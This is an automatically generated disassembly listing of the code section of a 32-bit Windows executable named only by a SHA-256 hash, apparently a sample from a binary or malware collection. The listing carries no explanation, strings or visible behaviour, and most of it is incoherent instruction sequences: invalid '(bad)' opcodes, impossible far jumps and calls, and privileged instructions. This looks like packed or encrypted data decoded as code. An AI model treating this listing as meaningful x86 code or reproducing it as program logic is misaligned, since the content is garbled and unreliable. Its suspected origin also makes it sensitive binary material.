
276fcc414403446d7ec3874efc2e14afa621ccb7fc519b61aa9382ffa48b17c5.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    BYTE PTR [eax],al
  401002:	add    BYTE PTR [eax],al
  401004:	call   0x8d6880
  401009:	add    BYTE PTR [eax],al
  40100b:	add    BYTE PTR [edx],al
  40100d:	add    BYTE PTR [eax],al
  40100f:	add    BYTE PTR [ebp+0x0],cl
  401012:	add    BYTE PTR [eax],al
  401014:	add    al,ah
  401016:	add    BYTE PTR [eax],al
  401018:	add    BYTE PTR [esi+0x554d0000],ah
  40101e:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  401024:	mov    esp,ebp
  401026:	or     ah,dh
  401028:	dec    ebp
  401029:	add    bh,al
  40102b:	add    BYTE PTR [eax],cl
  40102d:	add    BYTE PTR [eax],al
  40102f:	mov    DWORD PTR [eax],0x40f44545
  401035:	cmp    BYTE PTR [eax],al
  401037:	test   DWORD PTR [ebx-0x34070b64],ecx
  40103d:	(bad)  
  40103e:	enter  0x4d45,0xbc
  401042:	mov    edi,DWORD PTR [ebx]
  401044:	hlt    
  401045:	test   ebx,ecx
  401047:	pushf  
  401048:	enter  0x4df8,0x8b
  40104c:	mov    DWORD PTR [ebp-0x20],0x890208
  401053:	inc    ebp
  401054:	inc    ebp
  401055:	cld    
  401056:	xor    cl,BYTE PTR [ebx-0xb38b300]
  40105c:	or     BYTE PTR [ebx+0x0],dl
  40105f:	mov    ebx,0x8bd5900
  401064:	call   DWORD PTR [ecx-0x1]
  401067:	pop    es
  401068:	mov    ch,0x33
  40106a:	dec    ebx
  40106c:	(bad)  
  40106d:	mov    eax,0x72009fa4
  401072:	push   DWORD PTR [edx]
  401074:	or     BYTE PTR [eax],al
  401076:	jmp    0xff89:0x75c84d03
  40107d:	dec    ebp
  40107e:	loopne 0x401050
  401080:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  401086:	add    BYTE PTR [ebx],dh
  401088:	mov    ecx,ebx
  40108a:	hlt    
  40108b:	add    ecx,ebx
  40108d:	enter  0x899f,0x32
  401091:	dec    ebp
  401092:	add    ecx,eax
  401094:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  40109a:	or     DWORD PTR [ebx-0xb00b29c],0x0
  4010a1:	xor    ecx,ebx
  4010a3:	retf   
  4010a4:	enter  0x4d03,0xc8
  4010a8:	mov    DWORD PTR fs:[eax],ebx
  4010ab:	lea    eax,[eax]
  4010ad:	push   esp
  4010ae:	mov    edi,edi
  4010b0:	fs (bad) 
  4010b2:	(bad)  
  4010b3:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  4010b9:	push   0xffffffff
  4010bb:	and    bh,bh
  4010bd:	pop    ecx
  4010be:	inc    eax
  4010bf:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  4010c5:	push   0xffffff8b
  4010c7:	pop    ecx
  4010c8:	cld    
  4010c9:	dec    ebp
  4010ca:	lea    ecx,[ecx+0x45ff08ff]
  4010d0:	mov    BYTE PTR [edx+0x1],cl
  4010d3:	add    BYTE PTR [eax],al
  4010d5:	mov    DWORD PTR [ebp+0x8],0x58008d
  4010dc:	dec    DWORD PTR [ebp-0x77]
  4010df:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  4010e6:	cld    
  4010e7:	dec    ebp
  4010e8:	jne    0x40111d
  4010ea:	lea    eax,[ebx]
  4010ec:	push   eax
  4010ed:	mov    edi,edi
  4010ef:	or     BYTE PTR [ecx+0x54a845],cl
  4010f5:	add    al,ch
  4010f7:	(bad)  
  4010f8:	sub    ebp,esp
  4010fa:	add    BYTE PTR [eax],al
  4010fc:	rol    BYTE PTR [eax],0x84
  4010ff:	inc    ebp
  401100:	add    dh,BYTE PTR [esi+0x0]
  401103:	add    BYTE PTR [ebp-0x73],al
  401106:	mov    ebp,DWORD PTR [esp+edx*4]
  401109:	inc    DWORD PTR [eax]
  40110b:	lea    ecx,[ebx-0x30074f4]
  401111:	call   0x411c96
  401116:	add    BYTE PTR [ebp+0x0],cl
  401119:	jne    0x40115c
  40111b:	dec    DWORD PTR [ebx-0x76210314]
  401121:	dec    ebp
  401122:	add    DWORD PTR [ebp+0x0],esi
  401125:	(bad)  
  401126:	xchg   ebp,eax
  401127:	loopne 0x401128
  401129:	inc    eax
  40112a:	inc    DWORD PTR [eax]
  40112c:	mov    ecx,DWORD PTR [ebp-0x4]
  40112f:	xor    edx,DWORD PTR [edx+0x7201b8]
  401135:	add    BYTE PTR [edx],dl
  401137:	enter  0x4d90,0x0
  40113b:	mov    eax,DWORD PTR [eax]
  40113d:	hlt    
  40113e:	add    al,0xa5
  401140:	mov    al,0xff
  401142:	add    bh,bh
  401144:	add    BYTE PTR [ebx],dh
  401146:	inc    DWORD PTR [ebx]
  401148:	sbb    al,0x89
  40114a:	jne    0x401124
  40114c:	mov    esp,DWORD PTR [ecx+0x4500fc]
  401152:	mov    eax,DWORD PTR [ebp-0xff0048]
  401158:	mov    DWORD PTR [eax-0x70],0xec58ed89
  40115f:	inc    DWORD PTR [ebp-0x75]
  401162:	fisttp QWORD PTR [esi+ebp*8]
  401165:	test   DWORD PTR [esi-0x1],esp
  401168:	inc    ebp
  401169:	(bad)  
  40116a:	aas    
  40116b:	inc    ebp
  40116c:	(bad)  
  40116d:	lea    edi,[esp+eiz*2-0x1]
  401171:	push   DWORD PTR [edi]
  401173:	mov    DWORD PTR ds:0x8000c7a0,edi
  401179:	mov    ebp,esp
  40117b:	cld    
  40117c:	jmp    0xdfff:0xeeff458d
  401183:	mov    bh,al
  401185:	add    DWORD PTR [eax-0x13ba1500],ecx
  40118b:	inc    DWORD PTR [ebp-0x4]
  40118e:	xlat   BYTE PTR ds:[ebx]
  40118f:	lea    edi,[edi]
  401191:	inc    edi
  401193:	jmp    FWORD PTR [eax-0x78]
  401196:	inc    DWORD PTR [ecx]
  401198:	aaa    
  401199:	add    BYTE PTR ds:0x6c00c757,bh
  40119f:	test   edi,edi
  4011a1:	pandn  mm0,mm5
  4011a4:	aas    
  4011a5:	add    bh,al
  4011a7:	mov    esi,DWORD PTR [eax-0x4]
  4011aa:	inc    DWORD PTR [eax+0xdf01ee]
  4011b0:	(bad)  
  4011b1:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4011b5:	mov    esp,ebx
  4011b7:	xchg   esp,eax
  4011b8:	rol    DWORD PTR [eax],cl
  4011ba:	(bad)  
  4011bb:	mov    edi,DWORD PTR [eax+0x3]
  4011be:	(bad)  
  4011bf:	cmp    al,0xd7
  4011c1:	dec    ebp
  4011c2:	ror    DWORD PTR [ebx+0x2ad8e8],0x0
  4011c9:	lea    ecx,[ebx-0x7f0003b4]
  4011cf:	push   edx
  4011d0:	add    DWORD PTR [ebp+0x0],edx
  4011d3:	mov    esi,DWORD PTR [eax]
  4011d5:	mov    WORD PTR [edx+0x0],gs
  4011d8:	add    BYTE PTR [ebx-0x778afc7b],cl
  4011de:	mov    eax,DWORD PTR [eax]
  4011e0:	cld    
  4011e1:	push   0x7d
  4011e3:	dec    DWORD PTR [ebx+0xd88c]
  4011e9:	push   edx
  4011ea:	mov    edx,DWORD PTR [ecx-0x4]
  4011ed:	call   DWORD PTR [eax+0x7d01fc]
  4011f3:	mov    ecx,DWORD PTR [ecx+0x509000fc]
  4011f9:	add    DWORD PTR [esi+0x0],edx
  4011fc:	test   DWORD PTR [ebp+0x75],eax
  4011ff:	jmp    0x947d:0xc7fce28b
  401206:	mov    ebp,ebx
  401208:	fcom   st(7)
  40120a:	add    bh,al
  40120c:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  401212:	add    edi,edi
  401214:	add    bh,bh
  401216:	addr16 in eax,dx
  401218:	add    dh,dl
  40121a:	push   eax
  40121b:	inc    ebp
  40121c:	push   esi
  40121d:	fisttp WORD PTR [ebx+0x4dc7f43f]
  401223:	test   BYTE PTR [ebx],dh
  401225:	(bad)  
  401226:	add    eax,0x4572c8
  40122b:	jecxz  0x4011ee
  40122d:	rol    DWORD PTR [edi+eax*8-0x22ff73ff],cl
  401234:	inc    esi
  401235:	jle    0x401237
  401237:	test   edi,eax
  401239:	jmp    esp
  40123b:	inc    DWORD PTR [eax]
  40123d:	in     eax,dx
  40123e:	add    dh,dl
  401240:	jne    0x4011c7
  401242:	mov    edi,edi
  401244:	cld    
  401245:	inc    DWORD PTR [ebp-0x14]
  401248:	mov    ebp,edx
  40124a:	mov    ah,0x85
  40124c:	add    bh,bh
  40124e:	call   0x1163d52
  401253:	enter  0x858b,0xfc
  401257:	inc    DWORD PTR [eax+0xeb01ff]
  40125d:	in     al,dx
  40125e:	xor    BYTE PTR [ebp-0xff0020],al
  401264:	mov    ebx,ebp
  401266:	cld    
  401267:	jle    0x4011f2
  401269:	mov    eax,0x50000001
  40126e:	add    DWORD PTR [ebp+0x45],eax
  401271:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  401277:	dec    DWORD PTR [ebx-0x3fd80318]
  40127d:	add    BYTE PTR [ebp-0xbf0040],dl
  401283:	inc    ebp
  401284:	das    
  401285:	mov    eax,DWORD PTR [eax]
  401287:	cld    
  401288:	push   eax
  401289:	mov    al,0x45
  40128b:	add    DWORD PTR [ebx+0x459c00],ecx
  401291:	mov    edi,edi
  401293:	mov    eax,0xe80800ff
  401298:	inc    ebp
  401299:	sub    cl,BYTE PTR [ebx-0x47000400]
  40129f:	add    al,0x1
  4012a1:	rol    BYTE PTR [eax],0x1e
  4012a4:	jne    0x4012eb
  4012a6:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  4012ac:	inc    DWORD PTR [ecx]
  4012ae:	call   0x853cb3
  4012b3:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  4012b9:	call   0x403cbf
  4012be:	xor    bh,bh
  4012c0:	push   edi
  4012c1:	adc    BYTE PTR [ebx-0x747423bb],al
  4012c7:	loopne 0x4012a5
  4012c9:	ret    
  4012ca:	loopne 0x40126b
  4012cc:	xor    DWORD PTR [edx],0x31
  4012cf:	cmp    edi,edi
  4012d1:	bswap  esp
  4012d3:	rol    BYTE PTR gs:[eax],0x5
  4012d7:	jmp    0x12b1421
  4012dc:	mov    eax,DWORD PTR [ebp-0x4]
  4012df:	add    BYTE PTR [eax+0xff0100],bh
  4012e5:	cld    
  4012e6:	jne    0x401365
  4012e8:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  4012ee:	lds    eax,FWORD PTR [ecx]
  4012f0:	add    BYTE PTR [eax],al
  4012f2:	push   eax
  4012f3:	cs inc ebp
  4012f5:	add    BYTE PTR [ebx+0x459850],cl
  4012fb:	mov    edi,edi
  4012fd:	test   al,0xff
  4012ff:	add    BYTE PTR [eax],cl
  401301:	inc    DWORD PTR [ebp-0x18]
  401304:	jmp    DWORD PTR [esi]
  401306:	fadd   QWORD PTR [eax]
  401308:	jge    0x401357
  40130a:	adc    BYTE PTR [ebx+0x459cb9],cl
  401310:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  401316:	lahf   
  401317:	mov    eax,0x30132
  40131c:	lea    esi,[ebp+0x2c]
  40131f:	xor    edi,edi
  401321:	(bad)  
  401322:	call   0x13f3c8f
  401327:	call   0x1343db7
  40132c:	jne    0x4012b9
  40132e:	xor    edi,esp
  401330:	add    eax,DWORD PTR [eax+0xc018d]
  401336:	push   DWORD PTR [eax]
  401338:	call   0xc93c94
  40133d:	int3   
  40133e:	inc    DWORD PTR [ebp-0x14]
  401341:	mov    ecx,DWORD PTR [ebp-0x28]
  401344:	xor    eax,DWORD PTR [eax]
  401346:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  40134c:	(bad)  
  40134d:	xchg   ebp,eax
  40134e:	in     al,0xff
  401350:	add    bh,bh
  401352:	add    BYTE PTR [eax*2+0x8508b00],al
  401359:	inc    ebp
  40135a:	ret    
  40135b:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff61]
  401362:	mov    edi,edi
  401364:	or     BYTE PTR [eax],cl
  401366:	inc    ebp
  401367:	test   DWORD PTR gs:[eax],eax
  40136a:	je     0x4013b1
  40136c:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  401372:	xor    edx,DWORD PTR [eax-0x73]
  401375:	push   ebp
  401376:	or     BYTE PTR [ebp+0x21007572],al
  40137c:	inc    ebp
  40137d:	in     al,dx
  40137e:	mov    ebp,DWORD PTR [eax]
  401380:	mov    esp,0x618bc345
  401385:	fmul   st,st(5)
  401387:	add    BYTE PTR [ebx],ch
  401389:	mov    eax,DWORD PTR [ebx]
  40138b:	cld    
  40138c:	loopne 0x40134e
  40138e:	inc    ebp
  40138f:	push   ebp
  401390:	cmp    ebp,eax
  401392:	movaps XMMWORD PTR [eax-0x74740100],xmm4
  401399:	cld    
  40139a:	fadd   DWORD PTR [eax+0x3b014d]
  4013a0:	jne    0x4013d2
  4013a2:	push   0xf8898557
  4013a7:	in     al,dx
  4013a8:	jne    0x4013ef
  4013aa:	lea    eax,[ebx+0x72e8dcc8]
  4013b0:	xor    DWORD PTR [ebx+0x7545bc00],ecx
  4013b6:	jmp    0x4013eb
  4013b8:	mov    edi,DWORD PTR [edi+0x4572bc]
  4013be:	xor    eax,edi
  4013c0:	adc    DWORD PTR [ebp-0xcd0061],0x8b9031
  4013ca:	rcl    BYTE PTR [eax-0x40],1
  4013cd:	inc    ebp
  4013ce:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  4013d6:	inc    ebp
  4013d7:	xchg   ebp,eax
  4013d8:	ud0    ebp,DWORD PTR [ebx]
  4013db:	inc    DWORD PTR [eax]
  4013dd:	jp     0x401455
  4013df:	add    BYTE PTR [edx+0x1f558050],cl
  4013e5:	mov    ecx,DWORD PTR [esp+esi*8]
  4013e8:	inc    eax
  4013e9:	retf   
  4013ea:	inc    ebp
  4013eb:	iret   
  4013ec:	jb     0x4013b6
  4013ee:	mov    eax,DWORD PTR [edi]
  4013f0:	enter  0x4545,0x1
  4013f4:	cmp    BYTE PTR [eax],al
  4013f6:	pushf  
  4013f7:	mov    ecx,DWORD PTR [ecx+0x3b4df0bc]
  4013fd:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  401404:	dec    ebp
  401405:	add    BYTE PTR [ebx],dh
  401407:	inc    ebp
  401408:	mov    DWORD PTR [ebx-0x3f601b4c],ecx
  40140e:	xor    dl,BYTE PTR [edx]
  401410:	add    eax,DWORD PTR [ebp-0x77]
  401413:	mov    eax,esp
  401415:	fmul   DWORD PTR [ebp-0x3d]
  401418:	xor    eax,DWORD PTR [ebx+eax*1+0x832899f]
  40141f:	mov    DWORD PTR [ebp-0x28],eax
  401422:	fadd   DWORD PTR [ebp-0x64]
  401425:	xor    eax,edi
  401427:	mov    ecx,0xff858db0
  40142c:	clc    
  40142d:	enter  0x4d45,0x3d
  401431:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  401438:	test   esi,edi
  40143a:	clc    
  40143b:	inc    DWORD PTR [ebp+0x45]
  40143e:	aas    
  40143f:	mov    ebx,DWORD PTR [eax+ecx*1+0x16a8c8c7]
  401446:	test   DWORD PTR [eax],edi
  401448:	clc    
  401449:	pushf  
  40144a:	inc    ebp
  40144b:	push   DWORD PTR [ecx]
  40144d:	cld    
  40144e:	pushf  
  40144f:	inc    ebp
  401450:	mov    edx,DWORD PTR [eax-0x28]
  401453:	ins    DWORD PTR es:[edi],dx
  401454:	push   ebp
  401455:	add    BYTE PTR [ebx],dh
  401457:	mov    DWORD PTR [ebx],eax
  401459:	sar    BYTE PTR [ebx],1
  40145b:	adc    BYTE PTR [edi],cl
  40145d:	dec    ebp
  40145e:	adc    al,0x8b
  401460:	add    al,dl
  401462:	jmp    0x1011632
  401467:	jb     0x4014b6
  401469:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  40146f:	xor    ecx,DWORD PTR [ebp+0x3b]
  401472:	xor    ecx,DWORD PTR [edi]
  401474:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  401478:	(bad)  
  40147a:	clc    
  40147b:	enter  0x8400,0x8b
  40147f:	pop    es
  401480:	mov    al,0x0
  401482:	push   ebp
  401483:	push   cs
  401484:	xor    ecx,eax
  401486:	xor    esp,ecx
  401488:	add    ebp,DWORD PTR [eax]
  40148a:	add    esi,DWORD PTR [eax]
  40148c:	(bad)  
  40148e:	retf   0x55c8
  401491:	repnz mov eax,DWORD PTR [ebp-0x10]
  401495:	(bad)  
  401496:	cli    
  401497:	fdivr  st,st(1)
  401499:	test   DWORD PTR [eax+edi*8],ecx
  40149c:	dec    ebp
  40149d:	inc    ebp
  40149e:	xor    edi,DWORD PTR [eax-0x7167afd]
  4014a4:	add    BYTE PTR [ebp+0x0],al
  4014a7:	mov    ecx,DWORD PTR [ebp-0x28]
  4014aa:	mov    ecx,ebx
  4014ac:	clc    
  4014ad:	jne    0x40147a
  4014af:	mov    esi,0xd672d3
  4014b4:	into   
  4014b5:	into   
  4014b6:	scas   eax,DWORD PTR es:[edi]
  4014b7:	dec    ebp
  4014b8:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  4014be:	sub    ecx,esi
  4014c0:	cmp    ecx,DWORD PTR [ebp+0x77]
  4014c3:	(bad)  
  4014c4:	mov    edi,eax
  4014c6:	mov    al,0x85
  4014c8:	mov    eax,edi
  4014ca:	add    BYTE PTR [ebp-0x75],al
  4014cd:	cmp    ah,BYTE PTR [esp+ebx*4-0x47cc38ab]
  4014d4:	xor    eax,DWORD PTR [ebp+0x4503f803]
  4014da:	(bad)  
  4014dc:	retf   0x559c
  4014df:	(bad)  
  4014e0:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  4014e7:	inc    ebp
  4014e8:	add    eax,0xeb9c4d3e
  4014ed:	(bad)  
  4014ee:	mov    ecx,esp
  4014f0:	lods   al,BYTE PTR ds:[esi]
  4014f1:	test   DWORD PTR [ebp-0x8],edx
  4014f4:	xor    ecx,DWORD PTR [ebp+0x33]
  4014f7:	mov    eax,DWORD PTR [ebx]
  4014f9:	lock add ecx,ebx
  4014fc:	bswap  esi
  4014fe:	retf   0x55d1
  401501:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  401507:	jmp    0x401502
  401509:	add    BYTE PTR ds:0xebc44d8b,al
  40150f:	push   ebp
  401510:	mov    ebp,DWORD PTR [ebx]
  401512:	test   al,0x8b
  401514:	push   ebp
  401515:	clc    
  401516:	xor    ecx,ebx
  401518:	xor    ecx,esi
  40151a:	add    edx,ecx
  40151c:	add    eax,DWORD PTR [edx+0xca010f]
  401522:	push   ebp
  401523:	dec    ebp
  401524:	mov    ecx,DWORD PTR [ebx-0x34050710]
  40152a:	stc    
  40152b:	rol    DWORD PTR ds:0xebce4dd6,cl
  401531:	scas   eax,DWORD PTR es:[edi]
  401532:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  401538:	xor    ebp,DWORD PTR [ebx]
  40153a:	xor    edi,DWORD PTR [ebx]
  40153c:	add    esi,DWORD PTR [edi+0x3]
  40153f:	mov    ecx,DWORD PTR [edi]
  401541:	clc    
  401542:	retf   0x55cb
  401545:	into   
  401546:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  40154d:	mov    eax,0x3376554d
  401552:	mov    esi,DWORD PTR [ebx]
  401554:	int3   
  401555:	add    edx,DWORD PTR [ebp+0x3]
  401558:	xor    ecx,DWORD PTR [edi]
  40155a:	xor    ecx,edx
  40155c:	add    edx,DWORD PTR [ebp+0x3]
  40155f:	mov    ecx,DWORD PTR [edi]
  401561:	lock retf 0x4dfa
  401565:	stc    
  401566:	mov    ecx,DWORD PTR [eax]
  401568:	or     BYTE PTR [ebp+0x4d],cl
  40156b:	jmp    0x10415fb
  401570:	dec    ebp
  401571:	dec    ebp
  401572:	(bad)  
  401573:	mov    ebx,esp
  401575:	clc    
  401576:	test   ebx,ecx
  401578:	clc    
  401579:	ror    DWORD PTR [ebp-0x2a],cl
  40157c:	mov    esi,ecx
  40157e:	call   0x3acb5b32
  401583:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  40158a:	retf   
  40158b:	ja     0x40155b
  40158d:	mov    ebp,DWORD PTR [eax-0x48]
  401590:	dec    ebp
  401591:	xor    ecx,DWORD PTR [di+0x3]
  401595:	mov    esp,esp
  401597:	clc    
  401598:	push   ebp
  401599:	retf   
  40159a:	mov    dl,bl
  40159c:	adc    esi,edx
  40159e:	jb     0x40156e
  4015a0:	add    BYTE PTR [edi-0x3b7474b3],ch
  4015a6:	call   0x4d6be128
  4015ab:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  4015b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4015b2:	lahf   
  4015b3:	inc    ebp
  4015b4:	xor    cl,BYTE PTR [ebp-0x78]
  4015b7:	mov    edx,edi
  4015b9:	clc    
  4015ba:	dec    ebp
  4015bb:	retf   
  4015bc:	mov    edx,ebx
  4015be:	call   0x560ee999
  4015c3:	scas   eax,DWORD PTR es:[edi]
  4015c4:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  4015ca:	lahf   
  4015cb:	sub    esi,DWORD PTR [edx]
  4015cd:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  4015d3:	lods   al,BYTE PTR ds:[esi]
  4015d4:	xor    esp,DWORD PTR [ebx]
  4015d6:	add    ecx,DWORD PTR [ebp-0x1c]
  4015d9:	mov    edi,DWORD PTR [ebp-0x8]
  4015dc:	mov    bl,cl
  4015de:	cmp    dl,bl
  4015e0:	jb     0x4015b0
  4015e2:	add    dh,dl
  4015e4:	dec    ebp
  4015e5:	scas   eax,DWORD PTR es:[edi]
  4015e6:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  4015ec:	shr    DWORD PTR [ebx],cl
  4015ee:	into   
  4015ef:	cmp    edx,esi
  4015f1:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  4015f7:	dec    ebp
  4015f8:	dec    ebp
  4015f9:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  4015ff:	retf   
  401600:	xor    edx,esi
  401602:	add    ecx,esi
  401604:	imul   ecx,edx
  401607:	mov    DWORD PTR [ebp+0x8],edx
  40160a:	xor    ecx,DWORD PTR [ebp+0x2b]
  40160d:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  401613:	add    esi,DWORD PTR [ebx]
  401615:	mov    ah,0x3
  401617:	inc    ebp
  401618:	(bad)  
  40161b:	pushf  
  40161c:	jge    0x4015a7
  40161e:	xor    ebx,eax
  401620:	sub    eax,DWORD PTR [ebp-0x73]
  401623:	(bad)  
  401624:	cmp    al,al
  401626:	jb     0x4015ad
  401628:	add    al,bh
  40162a:	ror    DWORD PTR [ebp-0x7a],1
  40162d:	xor    edi,edi
  40162f:	add    edi,edi
  401631:	jmp    0x401680
  401633:	mov    ecx,DWORD PTR [ebx-0x34341324]
  401639:	dec    ebp
  40163a:	into   
  40163b:	mov    ebp,DWORD PTR [edi-0x23737428]
  401641:	lahf   
  401642:	shl    DWORD PTR [edx],cl
  401644:	retf   0x5588
  401647:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40164d:	add    eax,DWORD PTR [eax]
  40164f:	in     al,0x4d
  401651:	push   ebp
  401652:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  401658:	popa   
  401659:	add    ch,cl
  40165b:	dec    ebp
  40165c:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  401662:	dec    ebp
  401663:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  401669:	jge    0x401639
  40166b:	mov    BYTE PTR [edi+0xf723b3a],ch
  401671:	add    cl,dh
  401673:	dec    ebp
  401674:	dec    DWORD PTR [ebx-0x2c032375]
  40167a:	adc    BYTE PTR [ebp+0x1],0x8b
  40167e:	add    al,bl
  401680:	jge    0x40160e
  401682:	push   0xffffff9f
  401684:	push   0x8b3032
  401689:	shl    BYTE PTR [ebp+0x55],0x6a
  40168d:	xor    edi,edi
  40168f:	xor    edx,DWORD PTR [ebx+eax*1]
  401692:	inc    ebp
  401693:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  401699:	dec    ebp
  40169a:	or     BYTE PTR [ecx+0x4dc8e483],cl
  4016a0:	jbe    0x40162d
  4016a2:	mov    ebp,esp
  4016a4:	ror    bl,1
  4016a6:	enter  0x14ce,0xaf
  4016aa:	dec    DWORD PTR [ebx-0x2cef17f8]
  4016b0:	push   ebp
  4016b1:	retf   0x5540
  4016b4:	push   ebp
  4016b5:	mov    esi,DWORD PTR [edx-0x1c]
  4016b8:	mov    edx,ebx
  4016ba:	cld    
  4016bb:	(bad)  
  4016bc:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  4016c3:	sti    
  4016c4:	add    dh,cl
  4016c6:	push   0xffffff94
  4016c8:	call   FWORD PTR [edi+0x3b5032d0]
  4016ce:	mov    ecx,DWORD PTR [edi]
  4016d0:	int3   
  4016d1:	pop    esi
  4016d2:	inc    ebp
  4016d3:	dec    DWORD PTR [ecx+0x45e8c88b]
  4016d9:	push   ebp
  4016da:	xor    esi,DWORD PTR [ebx]
  4016dc:	mov    DWORD PTR [ebx],0xcace0f9c
  4016e2:	aas    
  4016e3:	push   ebp
  4016e4:	inc    ebp
  4016e5:	xor    eax,esi
  4016e7:	add    eax,esi
  4016e9:	mov    eax,DWORD PTR [ebx]
  4016eb:	(bad)  
  4016ec:	jmp    0x40167a
  4016ee:	mov    bl,BYTE PTR [edi-0x7674cdfb]
  4016f4:	rol    ah,1
  4016f6:	mov    esi,0xf133104d
  4016fb:	mov    edx,0xff348d80
  401700:	mov    dh,0xd1
  401702:	cmp    edx,DWORD PTR [ebp+0xf]
  401705:	mov    eax,DWORD PTR [edx-0x20]
  401708:	add    BYTE PTR [ebp-0x75],bh
  40170b:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  401712:	lahf   
  401713:	retf   0x8632
  401716:	cmp    ebp,0x8
  401719:	call   ebx
  40171b:	inc    ebp
  40171c:	inc    ebp
  40171d:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  401723:	mov    edi,DWORD PTR [eax]
  401725:	enter  0x49c,0xc7
  401729:	add    al,al
  40172b:	add    bl,al
  40172d:	(bad)  
  40172e:	clc    
  40172f:	enter  0x45,0x38
  401733:	push   eax
  401734:	pushf  
  401735:	mov    edi,eax
  401737:	int3   
  401738:	or     al,al
  40173a:	test   DWORD PTR [edi],edi
  40173c:	clc    
  40173d:	gs inc ebp
  40173f:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  401745:	push   ss
  401746:	xor    ecx,DWORD PTR [ebp+0x3]
  401749:	sub    edx,DWORD PTR [ecx-0x76]
  40174c:	dec    ebp
  40174d:	add    DWORD PTR [ebx+0x88d845],ecx
  401753:	mov    esi,DWORD PTR [ebx]
  401755:	or     BYTE PTR [ebx],al
  401757:	cmp    edx,DWORD PTR [ecx-0x38]
  40175a:	dec    ebp
  40175b:	out    dx,eax
  40175c:	xor    eax,DWORD PTR [ebp+0x3]
  40175f:	mov    edx,DWORD PTR [ecx-0x28]
  401762:	dec    ebp
  401763:	add    BYTE PTR [ebx],dh
  401765:	push   0x518003
  40176a:	push   eax
  40176b:	add    BYTE PTR [ebx-0x300748b],cl
  401771:	sbb    BYTE PTR [ebp+0x45],cl
  401774:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  40177a:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  401780:	dec    ebp
  401781:	inc    ebp
  401782:	xor    eax,esi
  401784:	add    eax,esi
  401786:	push   ecx
  401787:	(bad)  
  401788:	dec    ebp
  401789:	mov    al,ds:0x35e03dff
  40178e:	retf   
  40178f:	(bad)  
  401790:	into   
  401791:	sub    bh,bh
  401793:	dec    esp
  401794:	adc    al,0x9c
  401796:	inc    ebp
  401797:	push   ebp
  401798:	test   DWORD PTR [edi],ecx
  40179a:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab5ff80]
  4017a1:	jmp    0xc9b926b5
  4017a6:	add    cl,dl
  4017a8:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  4017b2:	cmp    cl,BYTE PTR [ebp+0x728b089c]
  4017b8:	rol    BYTE PTR [eax],0x59
  4017bb:	clc    
  4017bc:	popa   
  4017bd:	jb     0x4017c6
  4017bf:	mov    eax,DWORD PTR [ebp-0x30]
  4017c2:	xor    al,0x40
  4017c4:	sub    al,0xc7
  4017c6:	mov    ah,ch
  4017c8:	add    DWORD PTR [ebp+0x4534f845],eax
  4017ce:	sub    al,0x89
  4017d0:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  4017d7:	mov    ch,0xff
  4017d9:	clc    
  4017da:	add    DWORD PTR [ebp+0x60],0x3c
  4017de:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  4017e5:	inc    ebp
  4017e6:	dec    DWORD PTR [ebx-0x341ff701]
  4017ec:	test   esi,ecx
  4017ee:	dec    DWORD PTR [ebx-0x7f8a3301]
  4017f4:	push   eax
  4017f5:	add    DWORD PTR [ebp+0x0],eax
  4017f8:	dec    ebx
  4017fa:	or     al,0xce
  4017fc:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  401803:	into   
  401804:	add    BYTE PTR [ebx-0x34ff1400],cl
  40180a:	mov    esi,ecx
  40180c:	sar    bh,0x45
  40180f:	adc    al,0x8b
  401811:	clc    
  401812:	fadd   DWORD PTR [ebp+0x0]
  401815:	mov    ebp,DWORD PTR [edx+0x8]
  401818:	push   edi
  401819:	adc    BYTE PTR [eax+0x1],0x83
  40181d:	add    al,al
  40181f:	retf   
  401820:	mov    ecx,esi
  401822:	cld    
  401823:	mov    eax,DWORD PTR [eax+0xcb01cc]
  401829:	into   
